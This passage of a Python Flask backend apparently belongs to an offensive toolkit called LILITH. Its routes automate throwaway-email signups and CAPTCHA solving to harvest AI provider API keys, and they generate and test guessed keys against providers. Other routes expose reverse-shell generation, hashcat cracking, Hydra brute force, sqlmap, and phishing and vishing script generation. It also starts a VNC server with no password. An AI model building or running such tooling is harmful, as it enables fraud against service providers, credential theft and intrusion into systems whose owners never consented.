                results['ports'].append({'port': port, 'state': 'open'})
            sock.close()
        
        return jsonify({'success': True, 'results': results})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/payload/generate', methods=['POST'])
def payload_generate():
    data = request.json or {}
    payload_type = data.get('type', 'xss')
    target = data.get('target', '')
    
    return jsonify({
        'success': True,
        'payload': f'<script>/* {payload_type.upper()} payload for {target} */</ script>',
        'type': payload_type
    })

@app.route('/_dash/learning/stats', methods=['GET'])
def learning_stats():
    """Get LILITH learning statistics"""
    try:
        response = requests.get(f"{BACKEND_URL}/learning/stats", timeout=5)
        return jsonify(response.json())
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/learning/insights', methods=['GET'])
def learning_insights():
    """Get LILITH learning insights"""
    try:
        response = requests.get(f"{BACKEND_URL}/learning/insights", timeout=5)
        return jsonify(response.json())
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/coding/status', methods=['GET'])
def coding_status():
    """Get coding agent status"""
    try:
        response = requests.get(f"{BACKEND_URL}/coding_agent/status", timeout=5)
        return jsonify(response.json())
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/coding/generate', methods=['POST'])
def coding_generate():
    """Generate code using coding agent"""
    data = request.json or {}
    prompt = data.get('prompt', '')
    
    try:
        response = requests.post(
            f"{BACKEND_URL}/skill/run",
            json={'skill': 'coding-agent', 'task': prompt},
            timeout=60
        )
        return jsonify(response.json())
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/memory/save', methods=['POST'])
def memory_save():
    """Save to attack memory"""
    data = request.json or {}
    
    return jsonify({
        'success': True,
        'message': 'Memory saved',
        'data': data
    })

@app.route('/_dash/memory/recall', methods=['GET'])
def memory_recall():
    """Recall from attack memory"""
    return jsonify({
        'success': True,
        'memories': []
    })

@app.route('/_dash/backend/status', methods=['GET'])
def backend_status():
    """Proxy backend status to avoid CORS"""
    try:
        response = requests.get(f"{BACKEND_URL}/status", timeout=5)
        return jsonify(response.json())
    except Exception as e:
        return jsonify({'error': str(e), 'ai_providers': {'active_count': 0, 'total_count': 0}})

@app.route('/_dash/openclaw/skills', methods=['GET'])
def openclaw_skills():
    """Proxy OpenClaw skills to avoid CORS"""
    try:
        response = requests.get(f"{BACKEND_URL}/openclaw/redteam-skills", timeout=5)
        return jsonify(response.json())
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# ==================== VNC ROUTES ====================

@app.route('/_vnc/')
def vnc_index():
    """Serve noVNC main page"""
    try:
        vnc_url = "http://localhost:6080/vnc_lite.html?autoconnect=true&resize=scale"
        return f'''
        <html>
        <head>
            <style>
                body {{ margin: 0; padding: 0; background: #0a0a0a; overflow: hidden; }}
                iframe {{ width: 100%; height: 100vh; border: none; }}
            </style>
        </head>
        <body>
            <iframe src="{vnc_url}" allowfullscreen></iframe>
        </body>
        </html>
        '''
    except Exception as e:
        return f'VNC Error: {e}', 500

@app.route('/_vnc/<path:path>')
def vnc_proxy(path):
    """Proxy to noVNC server"""
    try:
        # noVNC runs on port 6080
        vnc_url = f"http://localhost:6080/{path}"
        response = requests.get(vnc_url, timeout=10)
        
        # Determine content type
        content_type = response.headers.get('Content-Type', 'text/html')
        if path.endswith('.js'):
            content_type = 'application/javascript'
        elif path.endswith('.css'):
            content_type = 'text/css'
        elif path.endswith('.html'):
            content_type = 'text/html'
        
        return response.content, response.status_code, {'Content-Type': content_type}
    except Exception as e:
        return f'VNC Error: {str(e)}', 503

@app.route('/_dash/vnc/status', methods=['GET'])
def vnc_status():
    """Check if VNC is running"""
    try:
        import subprocess
        result = subprocess.run(['pgrep', '-f', 'x11vnc'], capture_output=True)
        running = result.returncode == 0
        return jsonify({'running': running})
    except:
        return jsonify({'running': False})

@app.route('/_dash/browser/screenshot', methods=['GET'])
def browser_screenshot():
    """Take a screenshot of the current browser display"""
    try:
        import subprocess
        import base64
        
        # Check if display is available
        result = subprocess.run(['pgrep', '-f', 'Xvfb :99'], capture_output=True)
        if result.returncode != 0:
            return jsonify({'success': False, 'error': 'No active display'})
        
        # Take screenshot using xwd or scrot
        screenshot_path = '/tmp/browser_screenshot.png'
        
        # Try using import from ImageMagick
        env = os.environ.copy()
        env['DISPLAY'] = ':99'
        
        result = subprocess.run(
            ['import', '-window', 'root', screenshot_path],
            env=env,
            capture_output=True,
            timeout=5
        )
        
        if result.returncode != 0:
            # Try alternative method with scrot
            result = subprocess.run(
                ['scrot', screenshot_path],
                env=env,
                capture_output=True,
                timeout=5
            )
        
        if os.path.exists(screenshot_path):
            with open(screenshot_path, 'rb') as f:
                image_data = base64.b64encode(f.read()).decode('utf-8')
            os.remove(screenshot_path)
            return jsonify({'success': True, 'image': image_data})
        else:
            return jsonify({'success': False, 'error': 'Screenshot failed'})
            
    except subprocess.TimeoutExpired:
        return jsonify({'success': False, 'error': 'Screenshot timed out'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/vnc/start', methods=['POST'])
def start_vnc():
    """Start VNC server"""
    try:
        import subprocess
        # Start virtual display and VNC
        subprocess.Popen(['bash', '/app/tools/start_vnc.sh'], 
                        stdout=subprocess.DEVNULL, 
                        stderr=subprocess.DEVNULL)
        return jsonify({'success': True, 'message': 'VNC starting...'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# ==================== HARVEST ROUTES ====================

@app.route('/_dash/harvest/start', methods=['POST'])
def start_harvest():
    """Start autonomous API key harvesting with visible browser"""
    try:
        import subprocess
        import time as time_module
        
        data = request.json or {}
        provider = data.get('provider', 'groq')
        headless = data.get('headless', False)  # Default to visible browser
        
        if not headless:
            # Ensure Xvfb is running for visible browser
            # Kill any existing first
            subprocess.run(['pkill', '-9', 'Xvfb'], capture_output=True)
            subprocess.run(['pkill', '-9', 'x11vnc'], capture_output=True)
            subprocess.run(['pkill', '-f', 'websockify.*6080'], capture_output=True)
            time_module.sleep(1)
            
            # Start Xvfb
            subprocess.Popen(
                ['Xvfb', ':99', '-screen', '0', '1920x1080x24'],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                start_new_session=True
            )
            time_module.sleep(2)
            
            # Start x11vnc
            subprocess.Popen(
                ['x11vnc', '-display', ':99', '-forever', '-shared', '-rfbport', '5900', '-nopw'],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                start_new_session=True
            )
            time_module.sleep(1)
            
            # Start websockify for noVNC
            subprocess.Popen(
                ['websockify', '--web=/usr/share/novnc', '6080', 'localhost:5900'],
                stdout=open('/tmp/novnc.log', 'w'),
                stderr=subprocess.STDOUT,
                start_new_session=True
            )
            time_module.sleep(1)
        
        # Set environment for the harvester thread
        os.environ['DISPLAY'] = ':99'
        os.environ['PLAYWRIGHT_BROWSERS_PATH'] = '/pw-browsers'
        
        sys.path.insert(0, '/app/tools')
        from harvest_integration import start_harvesting_thread
        
        success = start_harvesting_thread(provider, headless=headless)
        
        if success:
            return jsonify({
                'success': True, 
                'message': f'Harvesting started for {provider}',
                'vnc_enabled': not headless,
                'vnc_url': '/_vnc/vnc.html' if not headless else None
            })
        else:
            return jsonify({'success': False, 'error': 'Harvesting already in progress'})
    except Exception as e:
        import traceback
        return jsonify({'success': False, 'error': str(e), 'trace': traceback.format_exc()})

@app.route('/_dash/harvest/status', methods=['GET'])
def harvest_status():
    """Get harvesting status"""
    try:
        sys.path.insert(0, '/app/tools')
        from harvest_integration import get_harvest_status
        
        status = get_harvest_status()
        return jsonify(status)
    except Exception as e:
        return jsonify({'active': False, 'error': str(e), 'logs': [], 'progress': 0})

@app.route('/_dash/harvest/keys', methods=['GET'])
def get_harvested_keys():
    """Get list of harvested API keys"""
    try:
        import json
        keys_path = '/app/config/harvested_keys.json'
        
        if os.path.exists(keys_path):
            with open(keys_path, 'r') as f:
                keys = json.load(f)
            return jsonify({'success': True, 'keys': keys})
        else:
            return jsonify({'success': True, 'keys': []})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e), 'keys': []})

@app.route('/_dash/harvest/save-key', methods=['POST'])
def save_manual_key():
    """Save a manually entered API key"""
    try:
        import json
        from datetime import datetime
        
        data = request.json or {}
        provider = data.get('provider', 'unknown')
        api_key = data.get('key', '')
        email = data.get('email', 'manual_entry')
        is_real = data.get('is_real', True)
        method = data.get('method', 'manual')
        
        if not api_key:
            return jsonify({'success': False, 'error': 'No API key provided'})
        
        keys_path = '/app/config/harvested_keys.json'
        os.makedirs('/app/config', exist_ok=True)
        
        # Load existing keys
        harvested_keys = []
        if os.path.exists(keys_path):
            with open(keys_path, 'r') as f:
                harvested_keys = json.load(f)
        
        # Remove existing key for this provider
        harvested_keys = [k for k in harvested_keys if k.get('provider') != provider]
        
        # Add new key
        harvested_keys.append({
            'provider': provider,
            'key': api_key,
            'email': email,
            'harvested_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'method': method,
            'is_real': is_real,
            'status': 'verified' if is_real else 'demo/unverified'
        })
        
        # Save
        with open(keys_path, 'w') as f:
            json.dump(harvested_keys, f, indent=2)
        
        return jsonify({'success': True, 'message': f'{provider} key saved'})
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# ==================== KEY ROTATION MANAGEMENT ROUTES ====================

@app.route('/_dash/rotation/start', methods=['POST'])
def start_key_rotation():
    """Start automatic key rotation and testing"""
    try:
        sys.path.insert(0, '/app/tools')
        from key_rotation_manager import get_rotation_manager
        
        data = request.json or {}
        providers = data.get('providers')
        keys_per_batch = data.get('keys_per_batch', 5)
        max_per_provider = data.get('max_per_provider', 1)
        
        manager = get_rotation_manager()
        result = manager.start(providers, keys_per_batch, max_per_provider)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/rotation/stop', methods=['POST'])
def stop_key_rotation():
    """Stop key rotation"""
    try:
        sys.path.insert(0, '/app/tools')
        from key_rotation_manager import get_rotation_manager
        
        manager = get_rotation_manager()
        result = manager.stop()
        
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/rotation/pause', methods=['POST'])
def pause_key_rotation():
    """Pause key rotation"""
    try:
        sys.path.insert(0, '/app/tools')
        from key_rotation_manager import get_rotation_manager
        
        manager = get_rotation_manager()
        result = manager.pause()
        
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/rotation/resume', methods=['POST'])
def resume_key_rotation():
    """Resume key rotation"""
    try:
        sys.path.insert(0, '/app/tools')
        from key_rotation_manager import get_rotation_manager
        
        manager = get_rotation_manager()
        result = manager.resume()
        
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/rotation/status', methods=['GET'])
def get_rotation_status():
    """Get rotation status"""
    try:
        sys.path.insert(0, '/app/tools')
        from key_rotation_manager import get_rotation_manager
        
        manager = get_rotation_manager()
        status = manager.get_status()
        
        return jsonify({'success': True, **status})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/rotation/keys', methods=['GET'])
def get_rotation_keys():
    """Get valid keys found by rotation"""
    try:
        sys.path.insert(0, '/app/tools')
        from key_rotation_manager import get_rotation_manager
        
        manager = get_rotation_manager()
        result = manager.get_valid_keys()
        
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/rotation/load', methods=['POST'])
def load_rotation_keys():
    """Load valid keys into session"""
    try:
        sys.path.insert(0, '/app/tools')
        from key_rotation_manager import get_rotation_manager
        
        manager = get_rotation_manager()
        result = manager.load_keys_to_session()
        
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/rotation/test-key', methods=['POST'])
def test_single_api_key():
    """Test a single API key"""
    try:
        sys.path.insert(0, '/app/tools')
        from key_rotation_manager import get_rotation_manager
        
        data = request.json or {}
        key = data.get('key', '')
        provider = data.get('provider', 'openai')
        
        if not key:
            return jsonify({'success': False, 'error': 'Key required'})
        
        manager = get_rotation_manager()
        result = manager.test_single_key(key, provider)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/rotation/modes', methods=['GET'])
def get_generation_modes():
    """Get available key generation modes"""
    try:
        sys.path.insert(0, '/app/tools')
        from key_rotation_manager import get_rotation_manager
        
        manager = get_rotation_manager()
        return jsonify(manager.get_generation_modes())
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/rotation/rate-limits', methods=['GET'])
def get_rate_limits():
    """Get rate limiting statistics"""
    try:
        sys.path.insert(0, '/app/tools')
        from key_rotation_manager import get_rotation_manager
        
        manager = get_rotation_manager()
        status = manager.get_status()
        return jsonify({
            'success': True,
            'rate_limits': status.get('rate_limits', {}),
            'rate_limited_count': status.get('stats', {}).get('rate_limited_count', 0)
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/harvest/generate-credentials', methods=['POST'])
def generate_credentials():
    """Generate temp email and password for signup"""
    try:
        sys.path.insert(0, '/app/tools')
        from temp_email_service import TempEmailService
        import random
        import string
        
        # Create temp email
        email_service = TempEmailService()
        email, _ = email_service.create_email()
        
        # Generate secure password
        lower = ''.join(random.choices(string.ascii_lowercase, k=4))
        upper = ''.join(random.choices(string.ascii_uppercase, k=4))
        digits = ''.join(random.choices(string.digits, k=4))
        special = ''.join(random.choices('!@#$', k=2))
        password_chars = list(lower + upper + digits + special)
        random.shuffle(password_chars)
        password = ''.join(password_chars)
        
        if email:
            return jsonify({
                'success': True,
                'email': email,
                'password': password,
                'token': email_service.email_token,
                'email_provider': email_service.provider
            })
        else:
            # Fallback email generation
            username = 'lilith' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
            fallback_email = f"{username}@tempmail.example.com"
            return jsonify({
                'success': True,
                'email': fallback_email,
                'password': password,
                'token': None,
                'email_provider': 'fallback',
                'note': 'Using fallback email - inbox checking not available'
            })
            
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# ==================== API KEY GENERATOR ROUTES ====================

@app.route('/_dash/keygen/generate', methods=['POST'])
def generate_api_key():
    """Generate API key for specified provider"""
    try:
        sys.path.insert(0, '/app/tools')
        from api_key_generator import get_key_generator
        
        data = request.json or {}
        provider = data.get('provider', 'generic')
        count = data.get('count', 1)
        include_checksum = data.get('include_checksum', False)
        
        gen = get_key_generator()
        
        if count == 1:
            result = gen.generate_key(provider, include_checksum=include_checksum)
            return jsonify({
                'success': True,
                'key': result['key'],
                'provider': result['provider'],
                'length': result['length'],
                'generated_at': result['generated_at']
            })
        else:
            results = gen.generate_batch(provider, min(count, 50))
            return jsonify({
                'success': True,
                'keys': [r['key'] for r in results],
                'provider': provider,
                'count': len(results)
            })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/keygen/providers', methods=['GET'])
def list_key_providers():
    """List all supported providers"""
    try:
        sys.path.insert(0, '/app/tools')
        from api_key_generator import get_key_generator
        
        gen = get_key_generator()
        providers = gen.list_providers()
        
        return jsonify({
            'success': True,
            'providers': providers,
            'count': len(providers)
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/keygen/validate', methods=['POST'])
def validate_api_key():
    """Validate an API key format"""
    try:
        sys.path.insert(0, '/app/tools')
        from api_key_generator import get_key_generator
        
        data = request.json or {}
        key = data.get('key', '')
        provider = data.get('provider')
        
        gen = get_key_generator()
        result = gen.validate_key(key, provider)
        
        return jsonify({
            'success': True,
            **result
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/keygen/batch', methods=['POST'])
def batch_generate_keys():
    """Generate keys for multiple providers"""
    try:
        sys.path.insert(0, '/app/tools')
        from api_key_generator import get_key_generator
        
        data = request.json or {}
        providers = data.get('providers', ['openai', 'groq', 'anthropic'])
        count_per_provider = data.get('count_per_provider', 1)
        
        gen = get_key_generator()
        results = gen.generate_multi_provider(providers, min(count_per_provider, 10))
        
        # Flatten for easy use
        all_keys = {}
        for provider, keys in results.items():
            all_keys[provider] = [k['key'] for k in keys]
        
        return jsonify({
            'success': True,
            'keys': all_keys,
            'providers': list(all_keys.keys())
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/keygen/stats', methods=['GET'])
def keygen_stats():
    """Get key generation statistics"""
    try:
        sys.path.insert(0, '/app/tools')
        from api_key_generator import get_key_generator
        
        gen = get_key_generator()
        return jsonify({
            'success': True,
            'stats': gen.get_stats()
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/harvest/check-email', methods=['POST'])
def check_temp_email():
    """Check temp email inbox"""
    try:
        sys.path.insert(0, '/app/tools')
        from temp_email_service import TempEmailService
        
        data = request.json or {}
        email = data.get('email')
        token = data.get('token')
        provider = data.get('provider')
        
        if not email or provider == 'fallback':
            return jsonify({
                'success': False,
                'error': 'Email checking not available for fallback emails'
            })
        
        # Recreate service with existing token
        email_service = TempEmailService()
        email_service.current_email = email
        email_service.email_token = token
        email_service.provider = provider
        
        # Check inbox
        messages = email_service.check_inbox(wait_seconds=10, check_interval=2)
        
        # Process messages
        processed_messages = []
        for msg in messages:
            content = email_service.get_message_content(msg.get('id', ''))
            verification_link = email_service.extract_verification_link(content) if content else None
            
            processed_messages.append({
                'subject': msg.get('subject', 'No Subject'),
                'from': msg.get('from', 'Unknown'),
                'verification_link': verification_link
            })
        
        return jsonify({
            'success': True,
            'messages': processed_messages,
            'count': len(processed_messages)
        })
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# ==================== METASPLOIT-LITE ROUTES ====================

@app.route('/_dash/msf/exploits', methods=['GET'])
def get_msf_exploits():
    """Get Metasploit-lite exploits"""
    try:
        sys.path.insert(0, '/app/tools')
        from metasploit_lite import get_metasploit
        
        search = request.args.get('search', None)
        msf = get_metasploit()
        result = msf.get_exploits(search)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/msf/payloads', methods=['GET'])
def get_msf_payloads():
    """Get Metasploit-lite payloads"""
    try:
        sys.path.insert(0, '/app/tools')
        from metasploit_lite import get_metasploit
        
        search = request.args.get('search', None)
        msf = get_metasploit()
        result = msf.get_payloads(search)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/msf/shells', methods=['POST'])
def generate_msf_shells():
    """Generate all reverse shells"""
    try:
        sys.path.insert(0, '/app/tools')
        from metasploit_lite import get_metasploit
        
        data = request.json or {}
        lhost = data.get('lhost', '127.0.0.1')
        lport = data.get('lport', 4444)
        
        msf = get_metasploit()
        result = msf.generate_all_shells(lhost, lport)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# ==================== HASHCAT ROUTES ====================

@app.route('/_dash/hashcat/identify', methods=['POST'])
def identify_hash_type():
    """Identify hash type"""
    try:
        sys.path.insert(0, '/app/tools')
        from metasploit_lite import get_hashcat
        
        data = request.json or {}
        hash_value = data.get('hash', '')
        
        if not hash_value:
            return jsonify({'success': False, 'error': 'No hash provided'})
        
        hc = get_hashcat()
        result = hc.identify_hash(hash_value)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/hashcat/crack', methods=['POST'])
def crack_hash_route():
    """Crack hash using hashcat"""
    try:
        sys.path.insert(0, '/app/tools')
        from metasploit_lite import get_hashcat
        
        data = request.json or {}
        hash_value = data.get('hash', '')
        mode = data.get('mode', 0)
        
        if not hash_value:
            return jsonify({'success': False, 'error': 'No hash provided'})
        
        hc = get_hashcat()
        
        if not hc.available:
            return jsonify({'success': False, 'error': 'Hashcat not installed'})
        
        result = hc.crack_hash(hash_value, mode=mode)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/hashcat/benchmark', methods=['GET'])
def hashcat_benchmark():
    """Run hashcat benchmark"""
    try:
        sys.path.insert(0, '/app/tools')
        from metasploit_lite import get_hashcat
        
        hc = get_hashcat()
        
        if not hc.available:
            return jsonify({'success': False, 'error': 'Hashcat not installed'})
        
        result = hc.benchmark()
        
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/harvest/apply', methods=['POST'])
def apply_harvested_keys():
    """Apply harvested keys to the running backend session"""
    try:
        import json
        keys_path = '/app/config/harvested_keys.json'
        
        if not os.path.exists(keys_path):
            return jsonify({'success': False, 'error': 'No harvested keys found'})
        
        with open(keys_path, 'r') as f:
            keys = json.load(f)
        
        if not keys:
            return jsonify({'success': False, 'error': 'No keys in database'})
        
        # Apply keys to the backend
        applied_count = 0
        for key_data in keys:
            try:
                response = requests.post(
                    f"{BACKEND_URL}/api/keys/add",
                    json={
                        'provider': key_data['provider'],
                        'api_key': key_data['key']
                    },
                    timeout=10
                )
                if response.status_code == 200:
                    applied_count += 1
            except:
                pass
        
        # Get updated status
        try:
            status_resp = requests.get(f"{BACKEND_URL}/status", timeout=5)
            status_data = status_resp.json()
            active_count = status_data.get('ai_providers', {}).get('active_count', 0)
            total_count = status_data.get('ai_providers', {}).get('total_count', 0)
        except:
            active_count = applied_count
            total_count = len(keys)
        
        return jsonify({
            'success': True,
            'applied': applied_count,
            'total': len(keys),
            'active_count': active_count,
            'total_count': total_count
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/system/restart', methods=['POST'])
def restart_backend():
    """Restart the backend service"""
    try:
        import subprocess
        
        # Restart the backend via pkill and restart
        subprocess.run(['pkill', '-f', 'lilith_full_backend'], capture_output=True)
        
        # Start it again
        subprocess.Popen(
            ['/root/.venv/bin/python3', '/app/tools/lilith_full_backend.py'],
            env={**os.environ, 'BACKEND_HOST': '0.0.0.0', 'BACKEND_PORT': '5000'},
            cwd='/app',
            stdout=open('/app/backend_out.log', 'w'),
            stderr=open('/app/backend_err.log', 'w')
        )
        
        return jsonify({'success': True, 'message': 'Backend restart initiated'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# ==================== ADVANCED CAPABILITIES PROXY ENDPOINTS ====================

@app.route('/_dash/capabilities/recon/passive', methods=['POST'])
def cap_recon_passive():
    """Proxy passive recon to backend"""
    try:
        response = requests.post(f"{BACKEND_URL}/capabilities/recon/passive", json=request.json, timeout=60)
        return jsonify(response.json())
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/capabilities/recon/active', methods=['POST'])
def cap_recon_active():
    """Proxy active recon to backend"""
    try:
        response = requests.post(f"{BACKEND_URL}/capabilities/recon/active", json=request.json, timeout=60)
        return jsonify(response.json())
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/capabilities/recon/full', methods=['POST'])
def cap_recon_full():
    """Proxy full recon to backend"""
    try:
        response = requests.post(f"{BACKEND_URL}/capabilities/recon/full", json=request.json, timeout=120)
        return jsonify(response.json())
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/capabilities/nlp/phishing', methods=['POST'])
def cap_nlp_phishing():
    """Proxy phishing generation to backend"""
    try:
        response = requests.post(f"{BACKEND_URL}/capabilities/nlp/phishing", json=request.json, timeout=30)
        return jsonify(response.json())
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/capabilities/nlp/vishing', methods=['POST'])
def cap_nlp_vishing():
    """Proxy vishing script to backend"""
    try:
        response = requests.post(f"{BACKEND_URL}/capabilities/nlp/vishing", json=request.json, timeout=30)
        return jsonify(response.json())
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/capabilities/ml/anomaly', methods=['POST'])
def cap_ml_anomaly():
    """Proxy anomaly detection to backend"""
    try:
        response = requests.post(f"{BACKEND_URL}/capabilities/ml/anomaly", json=request.json, timeout=30)
        return jsonify(response.json())
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/capabilities/crypto/analyze', methods=['POST'])
def cap_crypto_analyze():
    """Proxy crypto analysis to backend"""
    try:
        response = requests.post(f"{BACKEND_URL}/capabilities/crypto/analyze", json=request.json, timeout=30)
        return jsonify(response.json())
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/capabilities/crypto/keygen', methods=['POST'])
def cap_crypto_keygen():
    """Proxy key generation to backend"""
    try:
        response = requests.post(f"{BACKEND_URL}/capabilities/crypto/keygen", json=request.json, timeout=30)
        return jsonify(response.json())
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/capabilities/exploit/generate', methods=['POST'])
def cap_exploit_generate():
    """Proxy exploit generation to backend"""
    try:
        response = requests.post(f"{BACKEND_URL}/capabilities/exploit/generate", json=request.json, timeout=30)
        return jsonify(response.json())
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/capabilities/evasion/techniques', methods=['GET'])
def cap_evasion():
    """Proxy evasion techniques to backend"""
    try:
        response = requests.get(f"{BACKEND_URL}/capabilities/evasion/techniques", timeout=30)
        return jsonify(response.json())
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/capabilities/persistence/methods', methods=['GET'])
def cap_persistence():
    """Proxy persistence methods to backend"""
    try:
        os_type = request.args.get('os', 'linux')
        response = requests.get(f"{BACKEND_URL}/capabilities/persistence/methods?os={os_type}", timeout=30)
        return jsonify(response.json())
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/capabilities/wireless/attacks', methods=['GET'])
def cap_wireless():
    """Proxy wireless attacks to backend"""
    try:
        response = requests.get(f"{BACKEND_URL}/capabilities/wireless/attacks", timeout=30)
        return jsonify(response.json())
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/capabilities/physical/bypass', methods=['GET'])
def cap_physical():
    """Proxy physical bypass to backend"""
    try:
        response = requests.get(f"{BACKEND_URL}/capabilities/physical/bypass", timeout=30)
        return jsonify(response.json())
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/capabilities/supply-chain/analyze', methods=['POST'])
def cap_supply_chain():
    """Proxy supply chain analysis to backend"""
    try:
        response = requests.post(f"{BACKEND_URL}/capabilities/supply-chain/analyze", json=request.json, timeout=30)
        return jsonify(response.json())
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/capabilities/zeroday/methodology', methods=['GET'])
def cap_zeroday():
    """Proxy zero-day methodology to backend"""
    try:
        response = requests.get(f"{BACKEND_URL}/capabilities/zeroday/methodology", timeout=30)
        return jsonify(response.json())
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# ==================== NEW ENHANCED MODULE PROXIES ====================

@app.route('/_dash/offensive/nmap/quick', methods=['POST'])
def proxy_nmap_quick():
    """Proxy nmap quick scan"""
    try:
        response = requests.post(f"{BACKEND_URL}/offensive/nmap/quick", json=request.json, timeout=120)
        return jsonify(response.json())
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/offensive/sqlmap/test', methods=['POST'])
def proxy_sqlmap():
    """Proxy SQLMap test"""
    try:
        response = requests.post(f"{BACKEND_URL}/offensive/sqlmap/test", json=request.json, timeout=120)
        return jsonify(response.json())
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/offensive/dirs/brute', methods=['POST'])
def proxy_dir_brute():
    """Proxy directory brute force"""
    try:
        response = requests.post(f"{BACKEND_URL}/offensive/dirs/brute", json=request.json, timeout=120)
        return jsonify(response.json())
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/offensive/password/brute', methods=['POST'])
def proxy_password_brute():
    """Proxy Hydra password brute force"""
    try:
        response = requests.post(f"{BACKEND_URL}/offensive/password/brute", json=request.json, timeout=300)
        return jsonify(response.json())
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/offensive/hydra/services', methods=['GET'])
def proxy_hydra_services():
    """Get Hydra supported services"""
    try:
        response = requests.get(f"{BACKEND_URL}/offensive/hydra/services", timeout=30)
        return jsonify(response.json())
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/ml/analyze-events', methods=['POST'])
def proxy_ml_events():
    """Proxy ML events analysis"""
    try:
        response = requests.post(f"{BACKEND_URL}/ml/analyze-events", json=request.json, timeout=60)
        return jsonify(response.json())
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/ml/time-series', methods=['POST'])
def proxy_ml_timeseries():
    """Proxy ML time series analysis"""
    try:
        response = requests.post(f"{BACKEND_URL}/ml/time-series", json=request.json, timeout=60)
        return jsonify(response.json())
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/_dash/captcha/solve', methods=['POST'])
def proxy_captcha():
    """Proxy CAPTCHA solve request"""
    try:
        response = requests.post(f"{BACKEND_URL}/captcha/solve", json=request.json, timeout=60)
        return jsonify(response.json())
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# ==================== NETWORK CAPTURE ROUTES ====================

@app.route('/_dash/network/capture/start', methods=['POST'])
def start_network_capture():
    """Start packet capture"""
    try:
        sys.path.insert(0, '/app/tools')
        from network_capture import get_packet_capture
        
        data = request.json or {}
        interface = data.get('interface', None)
        count = data.get('count', 100)
        timeout = data.get('timeout', 60)
        filter_str = data.get('filter', None)
        
        capture = get_packet_capture(interface)
        result = capture.start_capture(count=count, timeout=timeout, filter_str=filter_str)
        
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

